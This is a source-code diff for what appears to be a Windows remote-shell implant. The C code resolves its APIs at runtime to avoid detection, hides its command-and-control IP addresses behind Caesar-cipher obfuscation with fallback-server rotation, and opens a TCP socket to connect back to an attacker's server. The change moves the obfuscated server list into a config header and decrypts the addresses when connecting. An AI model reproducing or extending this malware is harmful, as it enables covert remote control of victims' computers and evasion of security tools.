@@ -2,6 +2,7 @@
 #include <shlobj_core.h>
 #include <wininet.h>
 #include "utils.h"
+#include "config.h"
 #include "resolve_apis.h"
 
 #define Sleep_TIME 30
@@ -106,17 +107,11 @@ void SendShellEndedSignal(SOCKET sock) {
 
 #define FALLBACK_SERVERS 4
 
-char* fallback_servers[4];
 int serv = -1;
 int main() {
 	InitApis();
 
 	Message();
-
-	fallback_servers[0] = CAESAR_DECRYPT("6>736;=3638:");
-	fallback_servers[1] = CAESAR_DECRYPT("");
-	fallback_servers[2] = CAESAR_DECRYPT("");
-	fallback_servers[3] = CAESAR_DECRYPT("6>736;=36397");
 
 	Tmemset memset = Api.memset;
 
@@ -147,7 +142,7 @@ retry:
 	if (serv > FALLBACK_SERVERS - 1) {
 		serv = 0;
 	}
-	server.sin_addr.s_addr = Api.inet_addr(fallback_servers[serv]);
+	server.sin_addr.s_addr = Api.inet_addr(CAESAR_DECRYPT(fallback_servers[serv]));
 
 	//Create socket
 	sock = Api.socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
